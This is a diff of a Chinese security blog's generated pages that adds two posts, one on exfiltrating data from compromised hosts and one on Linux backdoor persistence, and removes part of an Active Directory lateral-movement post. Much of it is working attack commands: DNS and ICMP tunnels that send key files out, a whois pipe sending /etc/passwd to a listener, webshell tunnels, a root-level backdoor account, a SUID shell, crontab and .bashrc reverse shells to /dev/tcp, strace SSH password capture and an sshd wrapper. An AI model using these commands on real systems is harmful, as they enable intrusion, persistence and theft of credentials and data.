 <h3 id="客户端配置（web转发）"><a href="#客户端配置（web转发）" class="headerlink" title="客户端配置（web转发）"></a>客户端配置（web转发）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># frpc.ini</span><br><span class="line">[common]</span><br><span class="line">server_addr = x.x.x.x</span><br><span class="line">server_port = 7000</span><br><span class="line">token = www.baidu.com</span><br><span class="line">[web]</span><br><span class="line">type = http</span><br><span class="line">local_port = 8080</span><br><span class="line">custom_domains = www.yourdomain.com</span><br></pre></td></tr></table></figure>
 <h3 id="客户端配置（ssh转发）"><a href="#客户端配置（ssh转发）" class="headerlink" title="客户端配置（ssh转发）"></a>客户端配置（ssh转发）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># frpc.ini</span><br><span class="line">[common]</span><br><span class="line">server_addr = x.x.x.x</span><br><span class="line">server_port = 7000</span><br><span class="line">token = www.baidu.com</span><br><span class="line">[ssh]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 22</span><br><span class="line">remote_port = 6000</span><br></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/10/17/数据回传通道总结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2020/10/17/数据回传通道总结/" itemprop="url">
+                  数据回传通道总结
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-10-17T18:15:27+08:00">
+                2020-10-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2020/10/17/数据回传通道总结/" class="leancloud_visitors" data-flag-title="数据回传通道总结">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>攻陷目标主机之后并不意味着就不用再和防火墙斗智斗勇，数据回传的过程仍然有可能被防火墙发现和阻止，所以我们要根据实际情况选择更隐秘的方式传出文件。本文总结了常用的数据传出方式，将持续更新。</p>
+<h2 id="应用协议"><a href="#应用协议" class="headerlink" title="应用协议"></a>应用协议</h2><p>利用http.server回传<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">python2：</span><br><span class="line">python -m SimpleHTTPServer</span><br><span class="line">python3:</span><br><span class="line">python -m http.server</span><br><span class="line">php:</span><br><span class="line">php -S 0.0.0.0:8888</span><br></pre></td></tr></table></figure></p>
+<p>利用ftp回传<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service vsftpd start</span><br><span class="line">访问ip:21</span><br></pre></td></tr></table></figure></p>
+<p>利用smb回传<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">cd /etc/samba</span><br><span class="line">vi smb.conf</span><br><span class="line">文件内添加:</span><br><span class="line">[share]</span><br><span class="line">    path =/home/share</span><br><span class="line">    available = yes</span><br><span class="line">    browsealbe = yes</span><br><span class="line">    public= no</span><br><span class="line">    writable = yes</span><br><span class="line">cd /home</span><br><span class="line">mkdir share</span><br><span class="line">chmod -R 777 share</span><br><span class="line">useradd share</span><br><span class="line">smbpasswd -a share</span><br><span class="line">service smbd restart</span><br><span class="line">访问\\ip</span><br></pre></td></tr></table></figure></p>
+<p>利用scp回传<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp localfilename root@xx.xx.xx.xx:filename</span><br></pre></td></tr></table></figure></p>
+<h2 id="DNS隧道"><a href="#DNS隧道" class="headerlink" title="DNS隧道"></a>DNS隧道</h2><p>1.命令行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in $(xxd -p -c 10 ssh_host_ecdsa_key);do sleep 1s &amp;&amp; nslookup $i.xxx.com xx.xx.xx.xx;done</span><br></pre></td></tr></table></figure></p>
+<p>2.dnscat2、dns2tcp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">攻击机（server）：</span><br><span class="line">安装</span><br><span class="line">apt-get install ruby ruby-dev git make g++ rubygems</span><br><span class="line">gem update --system</span><br><span class="line">gem install bundler</span><br><span class="line">git clone https://github.com/iagox86/dnscat2.git</span><br><span class="line">cd dnscat2/server</span><br><span class="line">bundle install</span><br><span class="line">设置一个NS记录指向自己的子域名，再设置一个A记录指向自己部署server端的服务器地址，运行</span><br><span class="line">ruby ./dnscat2.rb dns.uuzdaisuki.com --no-cache</span><br><span class="line"></span><br><span class="line">受害者（linux）安装</span><br><span class="line">git clone https://github.com/iagox86/dnscat2.git</span><br><span class="line">cd dnscat2/client/</span><br><span class="line">make</span><br><span class="line">受害者（windows）安装</span><br><span class="line">https://downloads.skullsecurity.org/dnscat2/ 下载win32.zip的dnascat2后解压</span><br><span class="line"></span><br><span class="line">将server中产生的secret复制下来，运行</span><br><span class="line">./dnscat --dns domain=dns.uuzdaisuki.com --secret=xxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">session -i 1</span><br></pre></td></tr></table></figure>
+<p>详情参考：</p>
+<p><a href="http://next.uuzdaisuki.com/2018/08/07/%E5%88%A9%E7%94%A8DNS-Tunnel%E4%BC%A0%E8%BE%93%E6%95%B0%E6%8D%AE/" target="_blank" rel="noopener">http://next.uuzdaisuki.com/2018/08/07/%E5%88%A9%E7%94%A8DNS-Tunnel%E4%BC%A0%E8%BE%93%E6%95%B0%E6%8D%AE/</a></p>
+<h2 id="ping隧道"><a href="#ping隧道" class="headerlink" title="ping隧道"></a>ping隧道</h2><p>1.命令行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat a.txt | xxd -p -c 1|xargs -n 1 -I &apos;&#123;&#125;&apos; ping -c 1 -s 56 -p &apos;&#123;&#125;&apos; xx.xx.xx.xx</span><br></pre></td></tr></table></figure></p>
+<p>2.pingtunnel</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://www.cs.uit.no/~daniels/PingTunnel/</span><br><span class="line">ptunnel -p 192.168.100.232 -lp 8888 -da 192.168.118.131 -dp 3389</span><br><span class="line">    -p 指定ICMP隧道另一端的IP</span><br><span class="line">    -lp：指定本地监听的端口</span><br><span class="line">    -da：指定要转发的目标机器的IP</span><br><span class="line">    -dp：指定要转发的目标机器的端口</span><br><span class="line">    -x：指定连接密码</span><br></pre></td></tr></table></figure>
+<p>3.icmpsh展开cc通道：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">攻击者机器部署icmpsh：</span><br><span class="line">git clone https://github.com/inquisb/icmpsh.git</span><br><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all=1</span><br><span class="line">cd icmpsh</span><br><span class="line">syntax: ./icmpsh_m.py &lt;attacker’s-IP&gt; &lt;target-IP&gt;</span><br><span class="line">./icmpsh_m.py 192.168.1.108 192.168.1.106</span><br><span class="line">受害者机器：</span><br><span class="line">syntax: icmpsh.exe -t &lt;Kali IP&gt;</span><br><span class="line">icmpsh.exe -t 192.168.1.108</span><br></pre></td></tr></table></figure></p>
+<p>4.icmptunnel<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">受害者主机：</span><br><span class="line">安装icmptunnel</span><br><span class="line">git clone https://github.com/jamesbarlow/icmptunnel.git</span><br><span class="line">cd icmptunnel</span><br><span class="line">make</span><br><span class="line">禁用ICMP echo回复</span><br><span class="line">echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all</span><br><span class="line">服务端模式启动icmptunnel，并且给新的隧道接口分配一个IP地址</span><br><span class="line">./icmptunnel -s</span><br><span class="line">Ctrlz</span><br><span class="line">bg</span><br><span class="line">/sbin/ifconfig tun0 10.0.0.1 netmask 255.255.255.0</span><br><span class="line">ifconfig</span><br><span class="line"></span><br><span class="line">攻击者主机：</span><br><span class="line">安装icmptunnel</span><br><span class="line">git clone https://github.com/jamesbarlow/icmptunnel.git</span><br><span class="line">cd icmptunnel</span><br><span class="line">make</span><br><span class="line">禁用ICMP echo回复</span><br><span class="line">echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all</span><br><span class="line">运行</span><br><span class="line">./icmptunnel 192.168.1.108</span><br><span class="line">ctrl z</span><br><span class="line">/sbin/ifconfig tun0 10.0.0.2 netmask 255.255.255.0</span><br></pre></td></tr></table></figure></p>
+<h2 id="http隧道"><a href="#http隧道" class="headerlink" title="http隧道"></a>http隧道</h2><p>1.reGeorg<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/sensepost/reGeorg.git</span><br><span class="line">pip install urllib3</span><br><span class="line">将对应页面上传到目标服务器上</span><br><span class="line">并在本地监听</span><br><span class="line">python reGeorgSocksProxy.py ‐p 8080 ‐l 192.168.1.5 ‐u </span><br><span class="line">访问目标</span><br><span class="line">http://192.168.1.119/tunnel.aspx</span><br></pre></td></tr></table></figure></p>
+<p>2.ABPTTS<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">安装</span><br><span class="line">apt-get install python-dev  build-essential libssl-dev libffi-dev  libxml2-dev libxslt1-dev zlib1g-dev python-pip</span><br><span class="line"> pip install pycrypto</span><br><span class="line">git clone https://github.com/nccgroup/ABPTTS.git</span><br><span class="line">cd ABPTTS/</span><br><span class="line">生成payload</span><br><span class="line">python abpttsfactory.py ‐o webshell</span><br><span class="line">传到目标靶机</span><br><span class="line">端口转发</span><br><span class="line">python abpttsclient.py ‐c webshell/config.txt ‐u &quot;http://192.168.1.119/abptts.aspx&quot; ‐f 192.168.1.5:33389/192.168.1.119:3389</span><br><span class="line">让攻击机的33389端口流量转发到3389，通过HTTPS服务</span><br></pre></td></tr></table></figure></p>
+<h2 id="whois隧道"><a href="#whois隧道" class="headerlink" title="whois隧道"></a>whois隧道</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">失陷机：</span><br><span class="line">root@kali:~# whois -h x.x.x.x -p 4444 `cat /etc/passwd | base64`</span><br><span class="line">接受机：</span><br><span class="line">root@kali:/tmp# nc -l -v -p 4444 | sed &quot;&quot;s/ //g&quot;&quot; | base64 -d</span><br></pre></td></tr></table></figure>
+<h2 id="社交平台或工具"><a href="#社交平台或工具" class="headerlink" title="社交平台或工具"></a>社交平台或工具</h2><p>利用腾讯qq、微信等工具回传</p>
+<h2 id="代码托管"><a href="#代码托管" class="headerlink" title="代码托管"></a>代码托管</h2><p>利用github回传<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">通过一个匿名邮箱注册github账户，并创建一个空仓库</span><br><span class="line">mdkir upload</span><br><span class="line">cd upload</span><br><span class="line">git config --global user.name “user.name”</span><br><span class="line">git config --global user.email “user.email”</span><br><span class="line">git clone https://github.com/xxx/xxx.git</span><br><span class="line">cp -r file upload</span><br><span class="line">git add *</span><br><span class="line">git commit -m &quot;update&quot;</span><br><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure></p>
+<h2 id="云储存"><a href="#云储存" class="headerlink" title="云储存"></a>云储存</h2><p>利用百度网盘等网盘类工具回传</p>
+<h2 id="邮件"><a href="#邮件" class="headerlink" title="邮件"></a>邮件</h2><p>利用邮件外发回传</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/09/28/linux后门手法总结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2020/09/28/linux后门手法总结/" itemprop="url">
+                  linux后门手法总结
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-09-28T20:00:28+08:00">
+                2020-09-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2020/09/28/linux后门手法总结/" class="leancloud_visitors" data-flag-title="linux后门手法总结">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="创建用户"><a href="#创建用户" class="headerlink" title="创建用户"></a>创建用户</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">useradd guest;echo &apos;guest:123456&apos;|chpasswd</span><br><span class="line">echo &quot;guest:x:0:0::/:/bin/sh&quot; &gt;&gt; /etc/passwd</span><br></pre></td></tr></table></figure>
+<h2 id="ssh公钥登录"><a href="#ssh公钥登录" class="headerlink" title="ssh公钥登录"></a>ssh公钥登录</h2><p>将公钥放到服务器的.ssh/authorized_keys中，使用私钥登录</p>
+<h2 id="suid-shell"><a href="#suid-shell" class="headerlink" title="suid shell"></a>suid shell</h2><p>使用root账户执行如下命令，在某个用户目录下建立一个隐藏的suid文件.233，加点为了隐藏文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp /bin/bash /home/test/.233</span><br><span class="line">chmod 4755 /home/test/.233</span><br></pre></td></tr></table></figure></p>
+<p>之后在每次使用时，以其他普通用户的身份使用-p选项运行此文件，即可获得一个root权限的shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home/test/.233 -p</span><br></pre></td></tr></table></figure></p>
+<h2 id="ssh软连接"><a href="#ssh软连接" class="headerlink" title="ssh软连接"></a>ssh软连接</h2><p>创建ssh软连接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=5555;</span><br></pre></td></tr></table></figure></p>
+<p>攻击机连接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@ip:5555</span><br></pre></td></tr></table></figure></p>
+<h2 id="inetd"><a href="#inetd" class="headerlink" title="inetd"></a>inetd</h2><p>可以通过修改/etc/inetd.conf文件维持权限<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/inetd.conf</span><br><span class="line">添加内容</span><br><span class="line">daytime stream tcp nowait root /bin/bash bash -i</span><br><span class="line">重启服务</span><br><span class="line">service inetd restart</span><br></pre></td></tr></table></figure></p>
+<p>攻击者使用nc连接shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -vv ip 13</span><br></pre></td></tr></table></figure>
+<h2 id="Crontab后门"><a href="#Crontab后门" class="headerlink" title="Crontab后门"></a>Crontab后门</h2><p>每天6点反弹shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 6 * * * bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/端口 0&gt;&amp;1</span><br></pre></td></tr></table></figure></p>
+<h2 id="修改-bash-profile-和-bashrc"><a href="#修改-bash-profile-和-bashrc" class="headerlink" title="修改~/.bash_profile 和~/.bashrc"></a>修改~/.bash_profile 和~/.bashrc</h2><p>此类文件在新shell打开时会自动执行，将后门程序写入这类文件可以在每次打开新shell的时候进行一个反弹shell操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在文件中添加bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/端口 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>利用strace窃取ssh密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vi ~/.bashrc或者/etc/bashrc</span><br><span class="line">alias ssh=&apos;strace -f -e trace=read,write -o /tmp/.ssh-`date&apos;+%d%h%m%s&apos;`.log -s 32 ssh&apos;</span><br><span class="line">source ~/.bashrc</span><br><span class="line">cat /tmp/.sshxxxxx | grep &quot;read(4,&quot;</span><br></pre></td></tr></table></figure></p>
+<h2 id="SSH-wrapper后门"><a href="#SSH-wrapper后门" class="headerlink" title="SSH wrapper后门"></a>SSH wrapper后门</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/sbin/</span><br><span class="line">mv sshd ../bin/</span><br><span class="line">echo &apos;#!/usr/bin/perl&apos; &gt;sshd</span><br><span class="line">echo &apos;exec &quot;/bin/sh&quot; if(getpeername(STDIN) =~ /^..4A/);&apos; &gt;&gt;sshd</span><br><span class="line">echo &apos;exec&#123;&quot;/usr/bin/sshd&quot;&#125; &quot;/usr/sbin/sshd&quot;,@ARGV,&apos; &gt;&gt;sshd</span><br><span class="line">chmod u+x sshd</span><br><span class="line">/etc/init.d/sshd restart</span><br><span class="line">连接：</span><br><span class="line">socat STDIO TCP4:target_ip:22,sourceport=13377</span><br></pre></td></tr></table></figure>
 
           
         
@@ -1329,984 +2299,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/08/06/ad域渗透命令执行总结/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2020/08/06/ad域渗透命令执行总结/" itemprop="url">
-                  ad域渗透命令执行总结
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-08-06T20:57:21+08:00">
-                2020-08-06
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/笔记/" itemprop="url" rel="index">
-                    <span itemprop="name">笔记</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2020/08/06/ad域渗透命令执行总结/" class="leancloud_visitors" data-flag-title="ad域渗透命令执行总结">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>AD的全称是Active Directory：活动目录<br>域（Domain）是Windows网络中独立运行的单位，域之间相互访问则需要建立信任关系(即Trust Relation)。信任关系是连接在域与域之间的桥梁。当一个域与其他域建立了信任关系后两个域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理，以及相互通信和数据传输。</p>
-<p>在域渗透场景中，我们已经进入内网，会遇到大量的开放端口和服务，弱密码空密码，这个时候我们可以使用它们已经开启的服务选择对应的方式进行命令执行。本文对ad域渗透中常见的命令执行方式进行一个总结。</p>
-<h2 id="ipc"><a href="#ipc" class="headerlink" title="ipc"></a>ipc</h2><h3 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h3><p>开启ipc共享</p>
-<p>配置本地安全策略：开始-&gt;运行-&gt; secpol.msc-&gt;本地策略-&gt;安全选项-&gt;网络访问：共享&gt;和本地帐户的安全模型&gt;经典-本地用户进行身份验证</p>
-<p>配置本地组策略：运行gpedit.msc ——计算机配置——Windows设置——安全设置——本地策略<br>——安全选项——用户账户控制：以管理员批准模式运行所有管理员——禁用。</p>
-<h3 id="文件共享"><a href="#文件共享" class="headerlink" title="文件共享"></a>文件共享</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">写入后门文件</span><br><span class="line">net use z: \\目标IP\c$ &quot;passwd&quot; /user:&quot;admin&quot;</span><br><span class="line">或</span><br><span class="line">copy hack.bat \\目标ip\c$</span><br><span class="line">#删除连接</span><br><span class="line">net use \\目标IP\ipc$ /del</span><br></pre></td></tr></table></figure>
-<p>后续使用下面的方式执行</p>
-<h2 id="at-win10不可用"><a href="#at-win10不可用" class="headerlink" title="at(win10不可用)"></a>at(win10不可用)</h2><p>定时任务执行命令</p>
-<h3 id="前提-1"><a href="#前提-1" class="headerlink" title="前提"></a>前提</h3><p>开启windows Event log服务，开启Task Scheduler服务</p>
-<p>其余条件同ipc</p>
-<p>命令执行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">at \\170.170.64.19 23:00 c:\windows\system32\calc.exe</span><br><span class="line">at \\170.170.64.19 1 delete /yes #删除本机1号任务</span><br></pre></td></tr></table></figure>
